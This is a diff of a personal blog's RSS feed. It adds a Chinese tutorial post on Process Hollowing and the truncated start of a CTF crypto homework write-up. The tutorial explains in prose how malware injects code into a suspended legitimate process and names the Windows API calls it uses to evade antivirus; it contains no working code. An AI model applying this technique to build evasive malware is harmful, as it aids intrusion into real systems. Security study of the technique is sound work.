@@ -6,7 +6,266 @@
         <description>Recent content on 呂晟維 - luweber88.github.io</description>
         <generator>Hugo -- gohugo.io</generator>
         <language>en-us</language>
-        <lastBuildDate>Wed, 13 Oct 2021 00:00:00 +0000</lastBuildDate><atom:link href="https://weberlu88.github.io/index.xml" rel="self" type="application/rss+xml" /><item>
+        <lastBuildDate>Thu, 14 Oct 2021 00:00:00 +0000</lastBuildDate><atom:link href="https://weberlu88.github.io/index.xml" rel="self" type="application/rss+xml" /><item>
+        <title>資安攻擊技法 - Process Hollowing</title>
+        <link>https://weberlu88.github.io/p/process-hollowing/</link>
+        <pubDate>Thu, 14 Oct 2021 00:00:00 +0000</pubDate>
+        
+        <guid>https://weberlu88.github.io/p/process-hollowing/</guid>
+        <description>&lt;p&gt;這篇文章將會介紹 Process Hollowing 的原理並輔以程式碼片段加以解說。 根據 Mitre att&amp;amp;ck 的分類，Process Hollowing 是 Process Injection 的一門子類別，又可稱為 cross-process injection。這次的程式展示將以 Windows 作業系統為目標，Windows 的執行檔統稱 portable executables (PE)，因此此項技法又名為 Portable Executable Injection。&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;Tactics: Privilege Escalation, Defense Evasion
+Techniques: Process Injection
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;什麼是-process-hollowing&#34;&gt;什麼是 Process Hollowing&lt;/h2&gt;
+&lt;p&gt;Process Hollowing 是將惡意程式碼植入至 suspended 的 Process (執行緒)，達到可執行任意程式碼(arbitrary code execution)的目的，藉此偽裝被劫持的執行緒，繞過防毒軟體、應用程式偵測等防禦機制。最常見的範例是攻擊者自行 spawn 一個正常的 process，如 cmd.exe、svchost.exe，並且直接將其設為 suspend mode。&lt;/p&gt;
+&lt;p&gt;接下來有兩種做法，一是將惡意程式寫入原本 process 的 Image 中，二是另外分配一段記憶體給惡意程式再將原本 process 的 ImageBase 和 EntryPoint 指向新分配到的記憶體。最後攻擊者將 process 恢復執行即可掛羊頭賣狗肉的執行惡意程式了。&lt;/p&gt;
+&lt;p&gt;要注意的是，Process Hollowing 的權限是依據當前使用者的權限，或繼承父執行緒權限。若我們只 compromise 到一般使用者的帳號或執行階段(Session)，則只能獲得該使用者的權限。&lt;/p&gt;
+&lt;p&gt;技高一籌的攻擊行為是 Hijacking，攻擊者必須找到由 system admin 執行的 process 並且嘗試植入惡意程式，藉此獲得 admin 權限；找到 admin 權限的執行緒很容易，Hijacking 的精隨在於如何讓執行中的 process 進入 suspend mode 並知道它的 Image section 以 inject。&lt;/p&gt;
+&lt;p&gt;在教學之前，以些情境與名詞要先定義好:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;Executable&lt;/strong&gt;: Executable is a compiled form of a Program (HelloWorld.exe file) &lt;a class=&#34;link&#34; href=&#34;https://stackoverflow.com/questions/12999850/what-are-the-differences-between-a-program-an-executable-and-a-process&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;[i]&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;Process&lt;/strong&gt;: Process is the executable being run by OS (an active program). The one you see in Task Manager or Task List (HelloWord.exe Process when we double click it.) &lt;a class=&#34;link&#34; href=&#34;https://stackoverflow.com/questions/12999850/what-are-the-differences-between-a-program-an-executable-and-a-process&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;[i]&lt;/a&gt; Process (行程)本身不是基本執行單位，而是Thread (執行緒)的容器。Process 需要資源才能完成工作，如CPU、記憶體、檔案以及I/O裝置。&lt;a class=&#34;link&#34; href=&#34;https://totoroliu.medium.com/program-process-thread-%E5%B7%AE%E7%95%B0-4a360c7345e5&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;[ii]&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;Thread&lt;/strong&gt;: 略。&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;Image / Process image&lt;/strong&gt;: 執行檔運行後被載入至記憶體(RAM)時，這個記憶體區塊便稱為 Image。Executable files are loaded into the address space of a process using a memory mapped image file. &lt;a class=&#34;link&#34; href=&#34;https://www.tutorialspoint.com/inter_process_communication/inter_process_communication_process_image.htm&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;[i]&lt;/a&gt; &lt;a class=&#34;link&#34; href=&#34;https://docs.microsoft.com/en-us/windows-hardware/drivers/ifs/executable-images&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;[ii]&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;Source image&lt;/strong&gt;: The memory space of malicious process. (&lt;em&gt;virus&lt;/em&gt;)
+&lt;ul&gt;
+&lt;li&gt;Source = Mallicious code = Malware = 惡意程式。&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;Destination image&lt;/strong&gt;: The memory space of a legitimate process spawned by adversary. It is the target to be injected. (&lt;em&gt;victim&lt;/em&gt;)
+&lt;ul&gt;
+&lt;li&gt;Destination = Target。&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;ImageBase&lt;/strong&gt;: Image file 的起始位址。 The preferred address of the first byte of the image when it is loaded in memory. The default value for DLLs is 0x10000000. The default value for applications is 0x00400000. &lt;a class=&#34;link&#34; href=&#34;https://docs.microsoft.com/en-us/windows/win32/api/winnt/ns-winnt-image_optional_header32&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;[i]&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;EntryPoint&lt;/strong&gt;: Image file 的進入點位址，也就是 stackframe of main 的起始位址。The address to the entry point function of the process/image. &lt;a class=&#34;link&#34; href=&#34;https://docs.microsoft.com/en-us/windows/win32/api/winnt/ns-winnt-image_optional_header32&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;[i]&lt;/a&gt; The location in memory where the first instruction of execution will be placed. &lt;a class=&#34;link&#34; href=&#34;https://en.redinskala.com/finding-the-ep/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;[ii]&lt;/a&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;EntryPoint&lt;/strong&gt; = &lt;strong&gt;ImageBase&lt;/strong&gt; + &lt;strong&gt;AddressOfEntryPoint&lt;/strong&gt; (offset)&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;關於更多關於 PE file 的知識可以參考下方介紹。&lt;/p&gt;
+&lt;h2 id=&#34;逐步拆解-process-hollowing-的運作&#34;&gt;逐步拆解 Process Hollowing 的運作&lt;/h2&gt;
+&lt;h3 id=&#34;簡略流程&#34;&gt;簡略流程&lt;/h3&gt;
+&lt;p&gt;我們來看看 MicroSoft 對於 Process Hollowing 的介紹。&lt;/p&gt;
+&lt;p&gt;原文👉 &lt;a class=&#34;link&#34; href=&#34;https://www.microsoft.com/security/blog/2017/07/12/detecting-stealthier-cross-process-injection-techniques-with-windows-defender-atp-process-hollowing-and-atom-bombing/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;Process hollowing and atom bombing&lt;/a&gt;。&lt;/p&gt;
+&lt;p&gt;While there are few known techniques that achieve process hollowing, the most common variant typically follows &lt;strong&gt;four steps&lt;/strong&gt; to achieve stealthy execution of malicious code:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;The malware &lt;strong&gt;spawns a new instance of a legitimate process&lt;/strong&gt; (e.g., explorer.exe, lsass.exe, etc.), and places it in a &lt;strong&gt;suspended state&lt;/strong&gt;.&lt;/li&gt;
+&lt;li&gt;The malware then &lt;strong&gt;hollows out the memory section&lt;/strong&gt; in the new (and still suspended) process that holds the &lt;strong&gt;base address&lt;/strong&gt; of the legitimate code. To do this, the malware uses the &lt;em&gt;NtUnmapViewOfSection&lt;/em&gt; routine.&lt;/li&gt;
+&lt;li&gt;It allocates &lt;strong&gt;read-write-execute (RWX) memory&lt;/strong&gt; in the suspended process to prepare for the replacement malicious code.&lt;/li&gt;
+&lt;li&gt;The malware then &lt;strong&gt;copies malicious code&lt;/strong&gt; into the allocated memory. It changes the target address of the &lt;strong&gt;first thread&lt;/strong&gt; to the malicious program’s &lt;strong&gt;entry point&lt;/strong&gt;.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;When the thread resumes, the malicious code starts running, now disguised as a legitimate process. The malware is then free to delete remnants of itself from disk to avoid detection.&lt;/p&gt;
+&lt;h3 id=&#34;詳細流程&#34;&gt;詳細流程&lt;/h3&gt;
+&lt;p&gt;這篇引用 Autosectools.com 的 PDF 文件做更詳細的介紹。我們直接來看範例程式的輸出結果(stdout)來回推過程，其實不論是攻擊思路和程式都很直觀。&lt;/p&gt;
+&lt;p&gt;原文👉 &lt;a class=&#34;link&#34; href=&#34;https://www.autosectools.com/process-hollowing.pdf&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;https://www.autosectools.com/process-hollowing.pdf&lt;/a&gt;。&lt;/p&gt;
+&lt;p&gt;&lt;figure 
+	
+		class=&#34;gallery-image&#34; 
+		style=&#34;
+			flex-grow: 151; 
+			flex-basis: 362px&#34;
+	&gt;
+	&lt;a href=&#34;https://weberlu88.github.io/p/process-hollowing/img-bootstrap.png&#34; data-size=&#34;1045x691&#34;&gt;
+		&lt;img src=&#34;https://weberlu88.github.io/p/process-hollowing/img-bootstrap.png&#34;
+			width=&#34;1045&#34;
+			height=&#34;691&#34;
+			srcset=&#34;https://weberlu88.github.io/p/process-hollowing/img-bootstrap_hu0e491712396ea75bf4699d8b30dc4c4c_76100_480x0_resize_box_3.png 480w, https://weberlu88.github.io/p/process-hollowing/img-bootstrap_hu0e491712396ea75bf4699d8b30dc4c4c_76100_1024x0_resize_box_3.png 1024w&#34;
+			loading=&#34;lazy&#34;
+			alt=&#34;Process Hollowing 的架構概念圖&#34;&gt;
+	&lt;/a&gt;
+	
+	&lt;figcaption&gt;Process Hollowing 的架構概念圖&lt;/figcaption&gt;
+	
+&lt;/figure&gt;&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt;Creating destination process&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;Adversary 以合法的方式開啟一個 target process，並以 suspended state 執行。由於 target process 是我們親手建立的因此可以掌握它完整的資訊(PROCESS_INFORMATION)，如 pid 和 handle 等資訊。因為我們等等需要把 target process 跟它的記憶體區塊脫鉤，也要讀取它在 register 中的資訊，因此直接讓它進入 suspended state，待我們 inject 惡意程式之後再啟動它。&lt;/p&gt;
+&lt;p&gt;備註:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;em&gt;Handle&lt;/em&gt; is a reference to a process。&lt;a class=&#34;link&#34; href=&#34;https://stackoverflow.com/questions/12424045/what-is-the-difference-between-handle-and-thread&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;[i]&lt;/a&gt; &lt;a class=&#34;link&#34; href=&#34;https://en.wikipedia.org/wiki/Handle_%28computing%29&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;[ii]&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;em&gt;Process Creation Flags&lt;/em&gt;: CREATE_SUSPENDED - The primary thread of the new process is created in a suspended state, and does not run until the &lt;em&gt;ResumeThread&lt;/em&gt; function is called.。&lt;a class=&#34;link&#34; href=&#34;https://docs.microsoft.com/en-us/windows/win32/procthread/process-creation-flags&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;[i]&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;&lt;figure 
+	
+		class=&#34;gallery-image&#34; 
+		style=&#34;
+			flex-grow: 177; 
+			flex-basis: 425px&#34;
+	&gt;
+	&lt;a href=&#34;https://weberlu88.github.io/p/process-hollowing/img-states_modified.png&#34; data-size=&#34;856x483&#34;&gt;
+		&lt;img src=&#34;https://weberlu88.github.io/p/process-hollowing/img-states_modified.png&#34;
+			width=&#34;856&#34;
+			height=&#34;483&#34;
+			srcset=&#34;https://weberlu88.github.io/p/process-hollowing/img-states_modified_hu0bc9acbd06f817ef4007aea69482c779_45531_480x0_resize_box_3.png 480w, https://weberlu88.github.io/p/process-hollowing/img-states_modified_hu0bc9acbd06f817ef4007aea69482c779_45531_1024x0_resize_box_3.png 1024w&#34;
+			loading=&#34;lazy&#34;
+			alt=&#34;States of a Process in Operating Systems (from www.geeksforgeeks.org)&#34;&gt;
+	&lt;/a&gt;
+	
+	&lt;figcaption&gt;States of a Process in Operating Systems (from &lt;a href=&#34;http://www.geeksforgeeks.org&#34;&gt;www.geeksforgeeks.org&lt;/a&gt;)&lt;/figcaption&gt;
+	
+&lt;/figure&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt;Opening source file&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;讀入 source PE file (惡意程式碼的執行檔)。&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt;Unmapping destination section&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;使用 C++ 的 &lt;code&gt;NtUnmapViewOfSection()&lt;/code&gt; 方法將 target process 先前分配給行程的記憶體 unmap 掉。在第 8, 9 步我們會將 target process 的 memory section 指向第 2 步載入的惡意程式的 image。&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt;Allocating memory&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;接下來我們要使用 &lt;code&gt;VirtualAllocEx()&lt;/code&gt;方法要求另一塊記憶體空間給 source process (要植入的惡意程式)。在 PE file 的 optional header 中，SizeOfImage 這個欄位會記錄 image 所需的記憶體大小，我們就依照這個欄位來分配新的記憶體給 source process。&lt;/p&gt;
+&lt;p&gt;一般來說記憶體為了安全會依照可讀/可寫/可執行的用途來分配給不同 section，但我們簡化流程直接指定為可讀+可寫+可執行(RWX)。如果需要做到更好的偽裝則需按照 section 來分配不同安全層級的記憶體。&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt;Source image base: 0x00400000&lt;/strong&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt;Destination image base: 0x00A60000&lt;/strong&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt;Relocation delta: 0x00660000&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;有了記憶體空間，接下來要將 source image 的內容(&lt;em&gt;malware&lt;/em&gt;)，複製到 destination image 上(&lt;em&gt;victim&lt;/em&gt;)。需要經過兩階段才能複製完成整個 image，首先要複製 image 的 header，才能根據 header 的資訊複製各個 PE file section。&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt;Writing headers&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;在程式中，我們透過 &lt;code&gt;GetNTHeaders()&lt;/code&gt; 函數的回傳值拿到一個 &lt;code&gt;PIMAGE_NT_HEADERS32 pSourceHeaders&lt;/code&gt; pointer 指向表頭。&lt;/p&gt;
+&lt;p&gt;如下圖所示，我們要將 source header 複製一份寫入 destination header，但小等一下，由於 PE 表頭的 &lt;code&gt;OptionalHeader.ImageBase&lt;/code&gt; 欄位還記錄著 source 的 imageBase，必須把他改成 destination 的 imageBase 才能複製表頭，因為最後要 run 的是還是 victim process。&lt;/p&gt;
+&lt;p&gt;而我們用 dwDelta (一個 dword 整數)紀錄 source imageBase 與 destination imageBase 兩者的位址差，下一步驟複製 section 時會用到這個偏移量。&lt;/p&gt;
+&lt;p&gt;&lt;figure 
+	
+		class=&#34;gallery-image&#34; 
+		style=&#34;
+			flex-grow: 199; 
+			flex-basis: 478px&#34;
+	&gt;
+	&lt;a href=&#34;https://weberlu88.github.io/p/process-hollowing/img-delta.png&#34; data-size=&#34;4000x2008&#34;&gt;
+		&lt;img src=&#34;https://weberlu88.github.io/p/process-hollowing/img-delta.png&#34;
+			width=&#34;4000&#34;
+			height=&#34;2008&#34;
+			srcset=&#34;https://weberlu88.github.io/p/process-hollowing/img-delta_hu1ea6dffa76ab7e38844a7d17ce626e40_220966_480x0_resize_box_3.png 480w, https://weberlu88.github.io/p/process-hollowing/img-delta_hu1ea6dffa76ab7e38844a7d17ce626e40_220966_1024x0_resize_box_3.png 1024w&#34;
+			loading=&#34;lazy&#34;
+			alt=&#34;左邊是 source，要植入進右邊 destination&#34;&gt;
+	&lt;/a&gt;
+	
+	&lt;figcaption&gt;左邊是 source，要植入進右邊 destination&lt;/figcaption&gt;
+	
+&lt;/figure&gt;&lt;/p&gt;
+&lt;p&gt;BTW，這篇教學在寫入記憶體時一律呼叫 &lt;code&gt;WriteProcessMemory()&lt;/code&gt; 方法。&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt;Writing sections&lt;/strong&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;Writing &lt;em&gt;.text&lt;/em&gt; section to 0x00A8B000&lt;/strong&gt;&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;Writing &lt;em&gt;.rdata&lt;/em&gt; section to 0x00AE2000&lt;/strong&gt;&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;Writing &lt;em&gt;.data&lt;/em&gt; section to 0x00AF3000&lt;/strong&gt;&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;Writing &lt;em&gt;.idata&lt;/em&gt; section to 0x00AF7000&lt;/strong&gt;&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;Writing &lt;em&gt;.rsrc&lt;/em&gt; section to 0x00AF8000&lt;/strong&gt;&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;Writing &lt;em&gt;.reloc&lt;/em&gt; section to 0x00AF9000&lt;/strong&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;在程式中，我們透過 &lt;code&gt;GetLoadedImage()&lt;/code&gt; 函數的回傳值拿到一個 &lt;code&gt;PLOADED_IMAGE pSourceImage&lt;/code&gt; &lt;a class=&#34;link&#34; href=&#34;https://docs.microsoft.com/en-us/windows/win32/api/dbghelp/ns-dbghelp-loaded_image&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;pointer&lt;/a&gt; 指向存有 image 各項資訊的結構。從結構中可獲取 &lt;code&gt;NumberOfSections&lt;/code&gt; 的整數表示 image 中有幾個 section，以及 &lt;code&gt;Sections&lt;/code&gt; 指標指向了 &lt;a class=&#34;link&#34; href=&#34;https://docs.microsoft.com/en-us/windows/win32/api/winnt/ns-winnt-image_section_header&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;IMAGE_SECTION_HEADER&lt;/a&gt; 結構。&lt;/p&gt;
+&lt;p&gt;接著跟寫入表頭的方式一樣，使用 for-loop 依序把每個 image section 複製給 destination 即可。&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt;Rebasing image&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;這裡我看不懂，只知道如果偏移量存在(不等於零)要做這段與 relocation section 有關的操做。需要進行多次小片段的讀寫，會先呼叫 ReadProcessMemory()，再呼叫 WriteProcessMemory()。&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt;Getting thread context&lt;/strong&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt;Setting thread context&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;成功將 Mallicious code 植入進 destination image 了!! 但此時這個這個 process 是被 suspended 的，OS 會把這個 thread 的執行資訊(如:register暫存器的值以及program counter)保存起來放在 process control block (PCB) 的 &lt;a class=&#34;link&#34; href=&#34;https://docs.microsoft.com/en-us/windows/win32/api/winnt/ns-winnt-context&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;thread context&lt;/a&gt; 中，好讓該 thread 在被 CPU 再次執行時 resume 回先前的狀態，此動作稱為 context switch。&lt;/p&gt;
+&lt;p&gt;當一個 process 被 swap 進 suspended state 時，EAX register&lt;a class=&#34;link&#34; href=&#34;https://www.eecg.utoronto.ca/~amza/www.mindsec.com/files/x86regs.html&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;[i]&lt;/a&gt;&lt;a class=&#34;link&#34; href=&#34;https://zh.wikibooks.org/zh-tw/X86_%E6%B1%87%E7%BC%96/X86_%E6%9E%B6%E6%9E%84&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;[ii]&lt;/a&gt; 的值會被當作/設為該執行緒的 EntryPoint。因此需要修改 thread context 裡的 EAX register 為植入後程式的 EntryPoint 之絕對位置 (EntryPoint = ImageBase + AddresssOfEntryPoint)。&lt;/p&gt;
+&lt;p&gt;程式中的做法是 new 一個新的 context structure 來複製原本的 context 內容，將 EAX register 改成 source image (mallicious code) 的 EntryPoint；再把 context set 回去 destination image，讓執行緒重啟時能抓到並從 mallicious code&amp;rsquo;s EntryPoint 從頭開始執行植入的程式，達到任意執行程式碼的攻擊成果。&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt;Resuming thread&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;要重啟 process 很簡單，呼叫 &lt;code&gt;ResumeThread()&lt;/code&gt; 函數就好啦。OS 會把該行程加進 ready queue 等候執行。&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt;Process hollowing complete&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;我們的 cross-process injection 便大功告成囉，感謝各位的耐心收看! 有勘誤也歡迎指正。&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ol&gt;
+&lt;h2 id=&#34;pe-file-介紹&#34;&gt;PE file 介紹&lt;/h2&gt;
+&lt;p&gt;待補&lt;/p&gt;
+&lt;h2 id=&#34;程式碼展示&#34;&gt;程式碼展示&lt;/h2&gt;
+&lt;p&gt;待補，可能會寫在上方流程裡&lt;/p&gt;
+&lt;h2 id=&#34;process-hollowing-所受的限制&#34;&gt;Process Hollowing 所受的限制&lt;/h2&gt;
+&lt;p&gt;待補&lt;/p&gt;
+&lt;h2 id=&#34;qas&#34;&gt;QAs&lt;/h2&gt;
+&lt;p&gt;&lt;strong&gt;Q: 既然 Source image 會被覆寫掉為何要先 unmap 掉原本的記憶體空間?&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;A: &lt;em&gt;因為原先的記憶體會有不同的 memory protection，比如說 .text section (which holds program code) 是 execute/readonly，兩邊的 section 大小不一置的話會有權限不符的情況發生。另外若 source image size &amp;lt; dest 的話覆寫完還會有記憶體殘值留下。&lt;/em&gt;&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;Q: 為何 EAX register 存放著 process 的進入點?&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;A: &lt;em&gt;我不知道也查不到😢，c++和C#版的兩篇教學文都這樣說。&lt;/em&gt;&lt;/p&gt;
+&lt;h2 id=&#34;參考&#34;&gt;參考&lt;/h2&gt;
+&lt;p&gt;技術文章與實作 (超推必看)&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;a class=&#34;link&#34; href=&#34;https://www.microsoft.com/security/blog/2017/07/12/detecting-stealthier-cross-process-injection-techniques-with-windows-defender-atp-process-hollowing-and-atom-bombing/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;Detecting stealthier cross-process injection techniques with Windows Defender ATP: Process hollowing and atom bombing&lt;/a&gt;, &lt;a class=&#34;link&#34; href=&#34;http://www.microsoft.com&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;www.microsoft.com&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;autosectools.com&amp;rsquo;s PDF: &lt;a class=&#34;link&#34; href=&#34;https://www.autosectools.com/process-hollowing.pdf&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;https://www.autosectools.com/process-hollowing.pdf&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;C++ version: &lt;a class=&#34;link&#34; href=&#34;https://github.com/m0n0ph1/Process-Hollowing&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;https://github.com/m0n0ph1/Process-Hollowing&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;C# version: &lt;a class=&#34;link&#34; href=&#34;https://github.com/wireless90/ProcessInjector.NET/tree/main/ProcessInjector/ProcessHollowing&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;https://github.com/wireless90/ProcessInjector.NET/tree/main/ProcessInjector/ProcessHollowing&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;Mitre Attack&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;Process Injection &lt;a class=&#34;link&#34; href=&#34;https://attack.mitre.org/techniques/T1055/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;https://attack.mitre.org/techniques/T1055/&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;Process Injection: Process Hollowing: &lt;a class=&#34;link&#34; href=&#34;https://attack.mitre.org/techniques/T1055/012/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;https://attack.mitre.org/techniques/T1055/012/&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;Process Injection: Portable Executable Injection: &lt;a class=&#34;link&#34; href=&#34;https://attack.mitre.org/techniques/T1055/002/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;https://attack.mitre.org/techniques/T1055/002/&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;Process State&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;a class=&#34;link&#34; href=&#34;https://www.geeksforgeeks.org/states-of-a-process-in-operating-systems/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;https://www.geeksforgeeks.org/states-of-a-process-in-operating-systems/&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;Threading&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;Threads &amp;amp; Threading: &lt;a class=&#34;link&#34; href=&#34;https://docs.microsoft.com/en-us/dotnet/standard/threading/threads-and-threading&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;https://docs.microsoft.com/en-us/dotnet/standard/threading/threads-and-threading&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;Thread context: &lt;a class=&#34;link&#34; href=&#34;https://docs.microsoft.com/en-us/windows/win32/api/winnt/ns-winnt-context&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;https://docs.microsoft.com/en-us/windows/win32/api/winnt/ns-winnt-context&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;Context switch: &lt;a class=&#34;link&#34; href=&#34;https://en.wikipedia.org/wiki/Context_switch&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;https://en.wikipedia.org/wiki/Context_switch&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;Register&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;a class=&#34;link&#34; href=&#34;https://www.eecg.utoronto.ca/~amza/www.mindsec.com/files/x86regs.html&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;https://www.eecg.utoronto.ca/~amza/www.mindsec.com/files/x86regs.html&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a class=&#34;link&#34; href=&#34;https://zh.wikibooks.org/zh-tw/X86_%E6%B1%87%E7%BC%96/X86_%E6%9E%B6%E6%9E%84&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;https://zh.wikibooks.org/zh-tw/X86_%E6%B1%87%E7%BC%96/X86_%E6%9E%B6%E6%9E%84&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+</description>
+        </item>
+        <item>
         <title>高通膨年代，退休金「黃金4%法則」=&gt;「動態提領策略」</title>
         <link>https://weberlu88.github.io/p/updating-4-retire-rule/</link>
         <pubDate>Wed, 13 Oct 2021 00:00:00 +0000</pubDate>
@@ -139,6 +398,493 @@
 </description>
         </item>
         <item>
+        <title>HW0 write-up</title>
+        <link>https://weberlu88.github.io/p/hw0/</link>
+        <pubDate>Fri, 08 Oct 2021 00:00:00 +0000</pubDate>
+        
+        <guid>https://weberlu88.github.io/p/hw0/</guid>
+        <description>&lt;blockquote&gt;
+&lt;p&gt;Me: R10725012 呂晟維&lt;br&gt;
+CTF Account: ConstAaEqual7&lt;br&gt;
+Co-operator: R10725052&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;h2 id=&#34;crypto---image-xor&#34;&gt;Crypto - Image xor&lt;/h2&gt;
+&lt;ol&gt;
+&lt;li&gt;
+&lt;p&gt;題目附了一個加密的程式，可以發現他是用 &lt;code&gt;arr[i][j] ^= random.randint(0,255)&lt;/code&gt; xor 來加密。&lt;/p&gt;
+&lt;ul&gt;
